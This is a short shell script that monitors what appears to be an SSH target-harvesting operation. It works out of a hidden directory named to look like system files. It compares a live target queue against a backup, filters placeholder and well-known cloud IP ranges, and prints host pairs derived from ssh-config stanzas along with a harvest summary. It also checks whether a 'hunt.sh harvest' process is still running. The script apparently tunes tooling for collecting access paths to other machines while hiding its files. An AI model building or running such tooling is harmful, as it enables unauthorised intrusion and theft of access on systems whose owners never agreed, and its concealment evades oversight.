#!/bin/sh
# throwaway: did the filter/pair changes actually improve the live queue?
W=/tmp/.sysd/.hunt
sort /tmp/targets.bak > /tmp/a.s
sort "$W/targets.txt" > /tmp/b.s
echo "-- impossible hosts still in live targets:"
awk -F'\t' '$3 ~ /^(1\.2\.3\.4|12\.34\.56\.78|192\.30\.|140\.82\.|74\.125\.|64\.233\.|151\.101\.|1\.3\.6\.1|2\.6\.33\.|3\.14\.15\.92)$/ { n++ } END { print n + 0 }' "$W/targets.txt"
echo "-- rows: now=$(wc -l < "$W/targets.txt") backup=$(wc -l < /tmp/targets.bak) dropped=$(comm -23 /tmp/a.s /tmp/b.s | wc -l) new=$(comm -13 /tmp/a.s /tmp/b.s | wc -l)"
echo "-- precise pairs (all):"
cat "$W/pairs.txt" 2>/dev/null
echo "-- sample of new rows:"
comm -13 /tmp/a.s /tmp/b.s | head -10
echo "-- pairs derived from ssh-config stanzas:"
grep -c . "$W/pairs.txt" 2>/dev/null
echo "-- harvest summary:"
cat /tmp/harvest.out 2>/dev/null
echo "-- still running: $(ps -ef | grep -c '[h]unt.sh harvest')"
